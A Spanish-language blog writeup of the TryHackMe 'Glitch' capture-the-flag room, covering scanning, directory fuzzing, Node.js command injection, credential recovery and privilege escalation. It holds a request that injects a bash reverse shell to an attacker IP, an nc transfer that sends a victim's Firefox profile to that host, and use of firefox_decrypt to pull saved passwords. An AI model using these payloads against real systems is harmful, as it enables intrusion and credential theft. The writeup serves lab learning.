---
layout: single
title: Glitch final
excerpt: "Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?"
date: 2022-05-06
classes: wide
header:
  teaser: /assets/images/thm-writeup-glitch/glitch_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - Linux
  - Web
  - Javascript
  - Privilege escalation
---

![logo](/assets/images/thm-writeup-glitch/glitch_logo.png)

[Link](https://tryhackme.com/room/glitch "Glitch")

This is a simple challenge in which you need to exploit a vulnerable web application and root the machine. It is beginner oriented, some basic JavaScript knowledge would be helpful, but not mandatory. Feedback is always appreciated.

---

## 1. Fase de reconocimiento

- Para conocer a que nos estamos enfrentando lanzamos el siguiente comando:

```css
ping -c 1 {ip}
```

![logo](/assets/images/thm-writeup-glitch/glitch_ping.png)

- De acuerdo con el ttl=63 sabemos que nos estamos enfrentando a una máquina con sistema operativo Linux.

---

## 2. Enumeración / Escaneo

- Escaneo de la totalidad de los **_65535_** puertos de red el cual guardamos en un archivo en formato **_nmap_** con el siguiente comando:

```css
└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn {ip} -oN allports
```

![nmap_allports](/assets/images/thm-writeup-glitch/glitch_nmap_allports.png)

---

- De acuerdo con el escaneo anterior, se encuentran el siguiente puerto abierto; 80 (htp)

- Escaeno de vulnerabilidades sobre los puerto 80:

```css
nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln
```

![nmap_allports](/assets/images/thm-writeup-glitch/glitch_nmap_vuln.png)

---

- Whatweb nos da la siguiente información:

```css
whatweb {ip}
```

![what_web] (/assets/images/thm-writeup-glitch/glitch_whatweb.png)

---

- Revisión de la URL **_<http://10.10.24.23>_**:

![URL] (/assets/images/thm-writeup-glitch/glitch_web.png)


- Buscando el la ruta **_robots.txt_**, nos muestra lo siguiente:

![URL](/assets/images/thm-writeup-glitch/glitch_robots.png)

---

## 3. WFUZ

- Escaeno de subdominios con wfuzz:

```css
 wfuzz --hc=404,273 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.24.13/FUZZ/

```

![wfuzz](/assets/images/thm-writeup-glitch/glitch_wfuzz.png)

- Con el anterior escaner encotramos las páginas  **secret - img - js**

---

## Gobuster

- Escaeno de subdominios con gobuster

```css
gobuster -w /usr/share/dirb/wordlists/common.txt dir -u http://10.10.24.13 -x html,php,txt -k   
```

- Con el anterior escaner encotramos las páginas  **secret - img - js**

## 5 Burpsuite

- Realizamos la captura mediante burpsuite y nos encotramos con lo siguiente

![Burp](/assets/images/thm-writeup-glitch/glitch_burp_home.png)




```css
POST /api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/10.9.0.68/4444+0>%261"') HTTP/1.1
Host: 10.10.27.123
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=value
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```


### TAR Comprimir

```css
user@ubuntu:~$ tar -czvf .firefox
user@ubuntu:~$ ls
firefox.tar.gz  user.txt

```

### Compartir archivo con nc

```css
[Terminal atacante]
─# nc -nlvp 3333 > firefox.tar.gz
listening on [any] 3333 ...
connect to [10.9.0.68] from (UNKNOWN) [10.10.24.13] 60530
─# ls
exp.py  firefox.tar.gz

[Terminal target]
user@ubuntu:~$ nc -nv 10.9.0.68 3333 < firefox.tar.gz
Connection to 10.9.0.68 3333 port [tcp/*] succeeded!
```

### TAR descomprimir

```css
└─# tar xvzf firefox.tar.gz 
.firefox/
.firefox/profiles.ini
.firefox/Crash Reports/
.firefox/Crash Reports/events/
.firefox/Crash Reports/InstallTime20200720193547
.firefox/b5w4643p.default-release/
.firefox/b5w4643p.default-release/key4.db
.firefox/b5w4643p.default-release/cookies.sqlite
.firefox/b5w4643p.default-release/prefs.js
...
```

### Exploit

- Descargamos el exploit desde la siguiente página <https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py> lo guardamos con el nombre **exp.py** 

- Lo ejecutamos con el siguiente comando y marcamos la opción **2** y de está manera obtenemos un usuario y contraseña:

```css
─# python3 exp.py .firefox 
Select the Mozilla profile you wish to decrypt
1 -> hknqkrn7.default
2 -> b5w4643p.default-release
2

Website:   https://glitch.thm
Username: 'v??????'
Password: 'l??????'

```
- Ingresamos con este usuario:

```css
user@ubuntu:~$ su v0id
su v0id
Password: l??????
v0id@ubuntu:/home/user$ 

```

### Root

```css
root@ubuntu:~# find / -type f -user root -perm -u=s 2>/dev/null
find / -type f -user root -perm -u=s 2>/dev/null
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/doas
root@ubuntu:~# 

```

```css
v0id@ubuntu:/home/user$  doas -u root /bin/bash
 doas -u root /bin/bash
Password: l???????

root@ubuntu:/home/user# cd /root
cd /root
root@ubuntu:~# cat root.txt
cat root.txt
THM{d????????}

```

### Fuentes

Writeup:

<https://www.aldeid.com/wiki/TryHackMe-GLITCH>